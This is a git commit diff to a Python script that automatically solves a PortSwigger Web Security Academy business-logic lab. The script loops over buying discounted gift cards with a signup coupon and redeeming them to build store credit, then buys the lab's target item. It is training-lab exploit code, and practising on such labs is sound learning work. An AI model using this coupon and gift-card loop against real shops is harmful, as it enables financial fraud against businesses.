9949706f3e78032086bca77dda741fd972096bca
jacopoaugelli <jacopo.augelli777@gmail.com>
2023-07-17 20:19:17 +0200

    Faster solution

--- PortSwigger/Business logic vulnerabilities/07_Blv.py
+++ PortSwigger/Business logic vulnerabilities/07_Blv.py
@@ -17,29 +17,45 @@ wiener = r.cookies.get('session')
 headers = {"Cookie":f"session={wiener}"}
 
 # GET DISCOUNTED GIFT CARDS
-
-for i in range(450):
+credit = float(re.findall(r'(?<=<strong>Store credit: \$)(.*?)(?=<\/strong>)', requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers).text)[0])
+while credit < 935.90:
+    
+    quantity = 9
+    
     try:
-        r = requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":2,"redir":"PRODUCT","quantity":1})
+        requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":2,"redir":"PRODUCT","quantity":quantity})
         r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
+        
         csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
-        r = requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
-        r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
-        r = requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})
+        requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
+        requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
+        
+        requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})
         r = requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)
-        giftcard = re.search(r'(?<=<td>)[A-Za-z0-9]{10}(?=<\/td>)', r.text).group(0)
-        r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers)
-        csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
-        r = requests.post("https://" + lab.id + ".web-security-academy.net/gift-card", headers=headers, data={"csrf":csrf,"gift-card":giftcard})
+        giftcards = re.findall(r'(?<=<td>)[A-Za-z0-9]{10}(?=<\/td>)', r.text)
+
+        for code in range(quantity):
+            r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers)
+            csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
+            requests.post("https://" + lab.id + ".web-security-academy.net/gift-card", headers=headers, data={"csrf":csrf,"gift-card":giftcards[code]})
+    
     except:
         continue
+    
+    credit = float(re.findall(r'(?<=<strong>Store credit: \$)(.*?)(?=<\/strong>)', requests.get("https://" + lab.id + ".web-security-academy.net/my-account", headers=headers).text)[0])
+    print(f"Credit: ${credit}", end='', flush=True)
+    print('\r', end='', flush=True)
+    quantity += 1
+
 # PUT JACKET INSIDE CART
-r = requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":1,"redir":"PRODUCT","quantity":1})
-r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
+requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":1,"redir":"PRODUCT","quantity":1})
+requests.post("https://" + lab.id + ".web-security-academy.net/cart/coupon", headers=headers, data={"csrf":csrf,"coupon":"SIGNUP30"}, allow_redirects=False)
+requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)
 
 # CHECKOUT
 requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})   
 requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)
+print('\n')
 
 try:
     assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
